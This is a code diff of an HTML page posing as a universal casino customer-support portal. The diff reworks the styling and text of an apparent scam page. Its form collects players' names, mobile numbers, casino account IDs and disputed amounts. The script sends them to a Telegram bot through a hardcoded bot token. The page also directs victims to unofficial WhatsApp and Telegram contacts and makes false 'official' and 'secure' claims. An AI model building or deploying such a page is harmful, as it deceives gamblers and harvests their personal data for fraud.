@@ -4,7 +4,7 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 
-<title>VIP Casino Priority Helpdesk</title>
+<title>All Casino Games Support Portal</title>
 
 <style>
 * {
@@ -15,174 +15,73 @@
 }
 
 body {
-    background: #000000;
+    /* Colorful dark background */
+    background: linear-gradient(135deg, #1a0b2e 0%, #0d1b2a 100%);
     display: flex;
     justify-content: center;
     color: #ffffff;
+    min-height: 100vh;
 }
 
 .app-container {
     width: 100%;
     max-width: 440px;
     min-height: 100vh;
-    /* Royal Gold Glow */
-    background: radial-gradient(circle at top, #261f00 0%, #0a0a0a 35%, #000000 100%);
+    background: rgba(20, 30, 48, 0.6);
+    backdrop-filter: blur(10px);
     display: flex;
     flex-direction: column;
     position: relative;
-    box-shadow: 0 0 25px rgba(0,0,0,0.9);
+    box-shadow: 0 0 25px rgba(0,0,0,0.8);
 }
 
 /* HEADER */
 .header {
-    background: rgba(10, 10, 10, 0.85);
-    backdrop-filter: blur(12px);
+    background: linear-gradient(90deg, #ff007a, #7928ca);
     display: flex;
     align-items: center;
-    justify-content: space-between;
-    padding: 16px 20px;
-    border-bottom: 1px solid rgba(212, 175, 55, 0.3);
+    justify-content: center;
+    padding: 18px 15px;
+    box-shadow: 0 4px 15px rgba(255, 0, 122, 0.4);
     position: sticky;
     top: 0;
     z-index: 10;
+    text-align: center;
 }
 
-.logo-box {
-    color: #d4af37; /* Metallic Gold */
+.header h1 {
+    font-size: 18px;
     font-weight: 900;
-    font-size: 20px;
-    letter-spacing: 1px;
-    display: flex;
-    align-items: center;
-    gap: 8px;
-    text-shadow: 0 2px 10px rgba(212, 175, 55, 0.4);
-}
-
-.status-badge {
-    display: flex;
-    align-items: center;
-    gap: 6px;
-    background: rgba(0, 255, 100, 0.1);
-    color: #00ff66;
-    font-size: 11px;
-    font-weight: 800;
-    padding: 6px 12px;
-    border-radius: 20px;
+    color: #fff;
     text-transform: uppercase;
-    border: 1px solid rgba(0, 255, 100, 0.2);
-}
-
-.status-dot {
-    width: 6px;
-    height: 6px;
-    background: #00ff66;
-    border-radius: 50%;
-    box-shadow: 0 0 8px #00ff66;
-    animation: blink 1.5s infinite;
-}
-
-@keyframes blink {
-    0% { opacity: 1; }
-    50% { opacity: 0.3; }
-    100% { opacity: 1; }
+    letter-spacing: 0.5px;
+    text-shadow: 0 2px 5px rgba(0,0,0,0.5);
 }
 
 /* MAIN CONTENT */
 .main-content {
     flex: 1;
-    padding: 25px 20px;
+    padding: 20px 15px;
 }
 
-/* INTRO DASHBOARD */
-.intro-dashboard {
+.welcome-text {
     text-align: center;
-    margin-top: 15px;
-    background: linear-gradient(145deg, #111, #0a0a0a);
-    border: 1px solid #222;
-    border-radius: 16px;
-    padding: 30px 20px;
-    box-shadow: 0 10px 30px rgba(0,0,0,0.6);
+    margin-bottom: 20px;
 }
 
-.intro-dashboard .crown-icon {
-    font-size: 40px;
-    margin-bottom: 10px;
+.welcome-text p {
+    font-size: 14px;
+    color: #a8b2c1;
+    line-height: 1.5;
 }
 
-.intro-dashboard h1 {
-    font-size: 22px;
-    font-weight: 900;
-    margin-bottom: 10px;
-    color: #fff;
-    letter-spacing: 0.5px;
-}
-
-.intro-dashboard p {
-    font-size: 13px;
-    color: #999;
-    line-height: 1.6;
-    margin-bottom: 25px;
-}
-
-.start-btn {
-    background: linear-gradient(135deg, #d4af37 0%, #aa771c 100%);
-    color: #000;
-    font-size: 15px;
-    font-weight: 900;
-    padding: 16px 20px;
-    width: 100%;
-    border: none;
-    border-radius: 8px;
-    text-transform: uppercase;
-    cursor: pointer;
-    box-shadow: 0 4px 15px rgba(212, 175, 55, 0.25);
-    transition: 0.2s;
-    letter-spacing: 0.5px;
-}
-
-.start-btn:active {
-    transform: translateY(3px);
-}
-
-/* FORM SECTION */
-.form-section {
-    display: none;
-    animation: slideUp 0.4s cubic-bezier(0.16, 1, 0.3, 1);
-}
-
-@keyframes slideUp {
-    from { opacity: 0; transform: translateY(20px); }
-    to { opacity: 1; transform: translateY(0); }
-}
-
-.form-header {
-    display: flex;
-    justify-content: space-between;
-    align-items: center;
-    margin-bottom: 25px;
-    padding-bottom: 15px;
-    border-bottom: 1px solid #222;
-}
-
-.form-header h2 {
-    font-size: 18px;
-    font-weight: 800;
-    color: #d4af37;
-}
-
-.back-btn {
-    background: none;
-    border: none;
-    color: #888;
-    font-size: 12px;
-    font-weight: 700;
-    cursor: pointer;
-    text-transform: uppercase;
-    transition: 0.2s;
-}
-
-.back-btn:hover {
-    color: #fff;
+/* FORM BOX */
+.form-box {
+    background: rgba(255, 255, 255, 0.05);
+    border-radius: 12px;
+    padding: 20px 15px;
+    border: 1px solid rgba(255, 255, 255, 0.1);
+    box-shadow: 0 8px 20px rgba(0,0,0,0.3);
 }
 
 .field {
@@ -191,22 +90,21 @@ body {
 
 .field label {
     display: block;
-    font-size: 11px;
+    font-size: 12px;
     font-weight: 700;
-    color: #aaa;
+    color: #00e5ff; /* Cyan color */
     margin-bottom: 6px;
     text-transform: uppercase;
     letter-spacing: 0.5px;
 }
 
-/* Modern Inputs */
 .field input,
 .field select {
     width: 100%;
-    padding: 15px;
+    padding: 14px;
     border-radius: 8px;
-    border: 1px solid #222;
-    background: #0d0d0d;
+    border: 1px solid rgba(255, 255, 255, 0.2);
+    background: rgba(0, 0, 0, 0.4);
     font-size: 14px;
     font-weight: 600;
     color: #fff;
@@ -215,35 +113,48 @@ body {
 }
 
 .field input::placeholder {
-    color: #444;
+    color: #7b8ea8;
 }
 
 .field input:focus,
 .field select:focus {
-    border-color: #d4af37;
-    background: #141414;
-    box-shadow: -4px 0 0 #d4af37; /* VIP Gold side-border effect */
+    border-color: #ff007a;
+    background: rgba(0, 0, 0, 0.6);
+    box-shadow: 0 0 10px rgba(255, 0, 122, 0.3);
 }
 
 .field select option {
-    background: #111;
+    background: #1a1a2e;
     color: #fff;
 }
 
-/* SUBMIT BUTTON */
+/* BUTTONS SECTION */
+.action-buttons {
+    margin-top: 25px;
+    display: flex;
+    flex-direction: column;
+    gap: 12px;
+}
+
+/* 1. SUBMIT BUTTON */
 .submit-btn {
     width: 100%;
-    background: linear-gradient(135deg, #d4af37 0%, #aa771c 100%);
-    color: #000;
+    background: linear-gradient(90deg, #ff9a9e 0%, #fecfef 99%, #fecfef 100%);
+    background: linear-gradient(to right, #f9d423 0%, #ff4e50 100%);
+    color: #fff;
     border: none;
     padding: 16px;
-    font-size: 15px;
+    font-size: 16px;
     font-weight: 900;
     border-radius: 8px;
-    margin-top: 15px;
     cursor: pointer;
     text-transform: uppercase;
-    box-shadow: 0 4px 15px rgba(212, 175, 55, 0.25);
+    box-shadow: 0 4px 15px rgba(255, 78, 80, 0.4);
+    transition: 0.2s;
+}
+
+.submit-btn:active {
+    transform: scale(0.98);
 }
 
 .submit-btn:disabled {
@@ -251,73 +162,55 @@ body {
     cursor: not-allowed;
 }
 
-/* TELEGRAM BANNER */
-.tg-banner {
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    gap: 10px;
-    background: #0a0a0a;
-    border: 1px solid #222;
-    border-radius: 8px;
-    padding: 16px;
-    margin-top: 20px;
-    text-decoration: none;
+/* 2. WHATSAPP BUTTON */
+.whatsapp-btn {
+    width: 100%;
+    background: linear-gradient(to right, #11998e, #38ef7d);
     color: #fff;
-    font-weight: 700;
-    font-size: 13px;
+    text-align: center;
+    text-decoration: none;
+    padding: 16px;
+    font-size: 15px;
+    font-weight: 800;
+    border-radius: 8px;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    gap: 8px;
+    box-shadow: 0 4px 15px rgba(56, 239, 125, 0.3);
     transition: 0.2s;
 }
 
-.tg-banner:hover {
-    border-color: #d4af37;
-    background: #111;
+/* 3. TELEGRAM BUTTON */
+.telegram-btn {
+    width: 100%;
+    background: linear-gradient(to right, #00c6ff, #0072ff);
+    color: #fff;
+    text-align: center;
+    text-decoration: none;
+    padding: 16px;
+    font-size: 15px;
+    font-weight: 800;
+    border-radius: 8px;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    gap: 8px;
+    box-shadow: 0 4px 15px rgba(0, 114, 255, 0.3);
+    transition: 0.2s;
 }
 
-.tg-banner span {
-    color: #d4af37;
-}
-
-/* SECURITY TEXT */
-.security-footer {
+/* FOOTER */
+.footer-text {
     text-align: center;
     margin-top: 30px;
-    font-size: 11px;
-    color: #666;
-    line-height: 1.6;
+    font-size: 12px;
+    color: #a8b2c1;
+    padding-bottom: 20px;
 }
 
-.security-footer strong {
-    color: #d4af37;
-    display: block;
-    margin-bottom: 3px;
-}
-
-/* BOTTOM NAV */
-.bottom-nav {
-    background: rgba(10, 10, 10, 0.95);
-    backdrop-filter: blur(10px);
-    display: flex;
-    justify-content: space-around;
-    padding: 12px 0 20px;
-    border-top: 1px solid #1a1a1a;
-}
-
-.nav-item {
-    text-align: center;
-    color: #666;
-    font-size: 10px;
-    font-weight: 600;
-}
-
-.nav-item span {
-    display: block;
-    font-size: 20px;
-    margin-bottom: 4px;
-}
-
-.nav-item.active {
-    color: #d4af37;
+.footer-text strong {
+    color: #00e5ff;
 }
 </style>
 </head>
@@ -328,119 +221,119 @@ body {
 
     <!-- Header Section -->
     <header class="header">
-        <div class="logo-box">👑 ELITE SUPPORT</div>
-        <div class="status-badge">
-            <span class="status-dot"></span> Live
-        </div>
+        <h1>All Casino Games Customer Care Portal</h1>
     </header>
 
     <!-- Main Content -->
     <main class="main-content">
         
-        <!-- INTRO DASHBOARD -->
-        <div class="intro-dashboard" id="introScreen">
-            <div class="crown-icon">🎰</div>
-            <h1>Universal VIP Helpdesk</h1>
-            <p>One-stop premium support for all your Casino platforms. Fast-track withdrawals, ID verification, and deposit issues.</p>
-            
-            <button class="start-btn" id="openFormBtn">
-                + Raise Priority Ticket
-            </button>
-            
-            <a href="https://t.me/helpcare789" target="_blank" class="tg-banner">
-                💬 Chat with VIP Agent <span>@helpcare789</span>
-            </a>
+        <div class="welcome-text">
+            <p>Fast and Secure Account Support for All Platforms.</p>
         </div>
 
-        <!-- TICKET FORM -->
-        <div class="form-section" id="formScreen">
-            <div class="form-header">
-                <h2>Ticket Details</h2>
-                <button class="back-btn" id="backBtn">✕ Cancel</button>
-            </div>
-
+        <div class="form-box">
             <form id="supportForm">
                 
                 <div class="field">
                     <label>Full Name</label>
-                    <input type="text" id="name" placeholder="Name as per Bank/ID" required>
+                    <input type="text" id="name" placeholder="Enter your full name" required>
                 </div>
 
                 <div class="field">
-                    <label>Mobile Number</label>
-                    <input type="tel" id="mobile" placeholder="Registered mobile number" required>
+                    <label>Registered Mobile</label>
+                    <input type="tel" id="mobile" placeholder="Enter mobile number" required>
                 </div>
 
                 <div class="field">
-                    <label>Casino Platform Name</label>
-                    <input type="text" id="platform" placeholder="e.g. Parimatch, 1xBet, Stake, etc." required>
+                    <label>Casino Name</label>
+                    <input type="text" id="platform" placeholder="e.g. Parimatch, 4rabet, etc." required>
                 </div>
 
                 <div class="field">
-                    <label>User ID / Account ID</label>
-                    <input type="text" id="userid" placeholder="Your Player ID on the site" required>
+                    <label>User ID / Game ID</label>
+                    <input type="text" id="userid" placeholder="Enter your Player ID" required>
                 </div>
 
                 <div class="field">
-                    <label>Dispute Amount (₹)</label>
-                    <input type="number" id="amount" placeholder="e.g. 10000" required>
+                    <label>Amount (₹)</label>
+                    <input type="number" id="amount" placeholder="Enter amount" required>
                 </div>
 
                 <div class="field">
-                    <label>Issue Category</label>
+                    <label>Select Issue Type</label>
                     <select id="problem" required>
                         <option value="" disabled selected>Select an issue...</option>
-                        <option value="Withdrawal Delayed/Pending">Withdrawal Delayed/Pending</option>
+                        <option value="Withdrawal Processing">Withdrawal Processing</option>
                         <option value="Withdrawal Declined">Withdrawal Declined</option>
-                        <option value="Deposit Not Credited">Deposit Not Credited</option>
-                        <option value="ID/KYC Verification">ID/KYC Verification Issue</option>
-                        <option value="Account Blocked/Restricted">Account Blocked/Restricted</option>
-                        <option value="Bonus/Promo Issue">Bonus/Promo Issue</option>
-                        <option value="Other / General Query">Other / General Query</option>
+                        <option value="Deposit Not Received">Deposit Not Received</option>
+                        <option value="Account Verification (KYC)">Account Verification (KYC)</option>
+                        <option value="ID Blocked">ID Blocked / Restricted</option>
+                        <option value="Bonus Issue">Bonus / Promo Issue</option>
+                        <option value="Other Issue">Other Issue</option>
                     </select>
                 </div>
 
-                <button type="submit" class="submit-btn" id="submitBtn">Submit Secure Ticket</button>
-            </form>
+                <!-- BUTTONS SECTION -->
+                <div class="action-buttons">
+                    <!-- 1. Submit Request -->
+                    <button type="submit" class="submit-btn" id="submitBtn">
+                        Submit Request
+                    </button>
 
-            <div class="security-footer">
-                <strong>🔒 256-Bit SSL Encrypted</strong>
-                Official support is strictly confidential. We never ask for passwords or OTPs.
-            </div>
+                    <!-- 2. WhatsApp Button -->
+                    <a href="https://wa.me/917300365084" target="_blank" class="whatsapp-btn">
+                        🟢 Contact via WhatsApp
+                    </a>
+
+                    <!-- 3. Telegram Button -->
+                    <a href="https://t.me/helpcare02" target="_blank" class="telegram-btn">
+                        🔵 Contact via Telegram
+                    </a>
+                </div>
+
+            </form>
+        </div>
+
+        <div class="footer-text">
+            <strong>100% Safe & Secure</strong><br>
+            Official Support Team will resolve your issue shortly.
         </div>
 
     </main>
-
-    <!-- Bottom Navigation -->
-    <div class="bottom-nav">
-        <div class="nav-item active"><span>🏠</span>Home</div>
-        <div class="nav-item"><span>🎰</span>Slots</div>
-        <div class="nav-item"><span>🎲</span>Live Casino</div>
-        <div class="nav-item"><span>🎧</span>Support</div>
-        <div class="nav-item"><span>👤</span>Profile</div>
-    </div>
-
 </div>
 
 <script>
-// UI Navigation Logic
-document.getElementById("openFormBtn").addEventListener("click", function() {
-    document.getElementById("introScreen").style.display = "none";
-    document.getElementById("formScreen").style.display = "block";
-});
+// "Tu" (Beep) Sound Banane Ka Function
+function playBeepSound() {
+    try {
+        const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+        const oscillator = audioCtx.createOscillator();
+        const gainNode = audioCtx.createGain();
+        
+        oscillator.type = 'sine'; // Smooth beep sound
+        oscillator.frequency.setValueAtTime(800, audioCtx.currentTime); // Frequency (Pitch)
+        gainNode.gain.setValueAtTime(0.1, audioCtx.currentTime); // Volume control
+        
+        oscillator.connect(gainNode);
+        gainNode.connect(audioCtx.destination);
+        
+        oscillator.start();
+        oscillator.stop(audioCtx.currentTime + 0.15); // Sirf 0.15 seconds ke liye awaaz aayegi
+    } catch(e) {
+        console.log("Audio not supported");
+    }
+}
 
-document.getElementById("backBtn").addEventListener("click", function() {
-    document.getElementById("formScreen").style.display = "none";
-    document.getElementById("introScreen").style.display = "block";
-});
-
-// Telegram Submission Logic
+// Form Submit Hone Par Kya Hoga
 document.getElementById("supportForm").addEventListener("submit", function(e) {
     e.preventDefault();
 
+    // 1. Play Sound
+    playBeepSound();
+
     const btn = document.getElementById("submitBtn");
     
-    // Values
+    // Values nikalna
     const name = document.getElementById("name").value.trim();
     const mobile = document.getElementById("mobile").value.trim();
     const platform = document.getElementById("platform").value.trim();
@@ -449,22 +342,22 @@ document.getElementById("supportForm").addEventListener("submit", function(e) {
     const problem = document.getElementById("problem").value;
 
     if (!name || !mobile || !platform || !userid || !amount || !problem) {
-        alert("Please complete all ticket details.");
+        alert("Please complete all details.");
         return;
     }
 
-    // TELEGRAM DETAILS 
+    // TELEGRAM DETAILS (Aapke diye hue)
     const botToken = "8939251323:AAEcW8aoTU69470Nje0NcmIOkFkiz3JVpWs";
     const chatId = "8151786936";
     const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
     const time = new Date().toLocaleString("en-IN", { timeZone: "Asia/Kolkata" });
     
-    // Message Format (Now includes Platform Name)
-    const message = `👑 *VIP CASINO TICKET* 👑\n\n👤 *Name:* ${name}\n📱 *Mobile:* ${mobile}\n🎰 *Casino:* ${platform}\n🆔 *User ID:* ${userid}\n💰 *Amount:* ₹${amount}\n⚠️ *Category:* ${problem}\n🕒 *Time:* ${time}`;
+    // Message Format jo Telegram par aayega
+    const message = `🎲 *ALL CASINO SUPPORT* 🎲\n\n👤 *Name:* ${name}\n📱 *Mobile:* ${mobile}\n🎰 *Casino:* ${platform}\n🆔 *User ID:* ${userid}\n💰 *Amount:* ₹${amount}\n⚠️ *Category:* ${problem}\n🕒 *Time:* ${time}`;
 
     btn.disabled = true;
-    btn.innerText = "Securing Ticket...";
+    btn.innerText = "Processing...";
 
     fetch(telegramApiUrl, {
         method: "POST",
@@ -484,20 +377,16 @@ document.getElementById("supportForm").addEventListener("submit", function(e) {
         return response.json();
     })
     .then(data => {
-        alert("Success! Your ticket has been registered. Our VIP agents will review your case immediately.");
+        alert("Request Submitted Successfully! Our team will resolve your issue.");
         document.getElementById("supportForm").reset();
-        
-        // Return to dashboard
-        document.getElementById("formScreen").style.display = "none";
-        document.getElementById("introScreen").style.display = "block";
     })
     .catch(error => {
         console.error(error);
-        alert("Error sending ticket. Please connect directly via Live Agent chat.");
+        alert("Error sending request. Please use WhatsApp or Telegram button below.");
     })
     .finally(() => {
         btn.disabled = false;
-        btn.innerText = "Submit Secure Ticket";
+        btn.innerText = "Submit Request";
     });
 });
 </script>
